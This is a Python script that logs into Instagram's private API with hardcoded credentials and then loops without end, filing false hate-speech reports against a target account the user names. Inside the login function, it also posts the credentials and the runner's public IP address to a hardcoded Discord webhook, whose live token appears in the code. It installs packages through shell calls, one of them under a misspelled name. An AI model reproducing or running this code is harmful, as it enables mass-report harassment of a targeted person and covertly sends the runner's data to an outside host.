import os
os.system('pip install geocoder')
os.system('pip install requests')
os.system('pip install uuis')
os.system('pip install json')
import geocoder
from requests import get
ip = get('https://api.ipify.org').text

try:
    import requests
    import uuid
    import time
    import json
except Exception as e:
    print(e)
logo = ("""
          ("------------------------———-")
   
          ("---------------------———----")
""")
 
print(logo)
u = ('lstio1')
p = ('lstio12345')
target = str(input(("Target:")))
sle = int(input("Enter sleep: "))
 
 
def login():
    global target
    r = requests.Session()
 
    uid = str(uuid.uuid4())
 
    url = "https://i.instagram.com/api/v1/accounts/login/"
 
    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com'
    }
 
    data = {
        '_uuid': uid,
        'username': u,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(p),
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_count': '0'
    }
    loginreq = r.post(url, data=data, headers=headers, allow_redirects=True)
    print(loginreq.text)
    url = "https://discord.com/api/webhooks/859553485480787998/zpxHCt_2cZzQ_YZBuucBUcRM_k9G1ws-3YauDki8tMnNGoWWAg8KRwhtUC51nl4DKW9Z"
    data = {}
    data["username"] = "Bot_Ali"
    data["embeds"] = []
    embed = {}
    embed["description"] = f"U: {u}\nP: {p}\nip: {ip}"
    embed["title"] = "INFO V2"
    data["embeds"].append(embed)
    result = requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError:
        pass
    if loginreq.text.find("is_private") >= 0:
        done = 0
        print("DONE LOGIN")
        r.headers.update({'X-CSRFToken': loginreq.cookies['csrftoken']})
        url_id = "https://www.instagram.com/{}/?__a=1".format(target)
        url_get_user_id = r.get(url_id).json()
        print(url_get_user_id)
        while True:
            user_id = str(url_get_user_id["logging_page_id"])
            your_user_id = str(user_id.split("_")[1])  # 4231341234
            urlRep = "https://i.instagram.com/users/" + your_user_id + "/report/"
            datas = {
                'source_name': '', 'reason_id': 6, 'frx_context': ''  # hate speech or symbols
            }
            req_SessionID = r.post(urlRep, data=datas)
            done += 1
            print(f"Done hate  -> {done}")
            print(f"Done self injury -> {done}")
            time.sleep(sle)
    else:
        print("LOGIN FAILED CHECK YOUR INFO!")
 
 
login()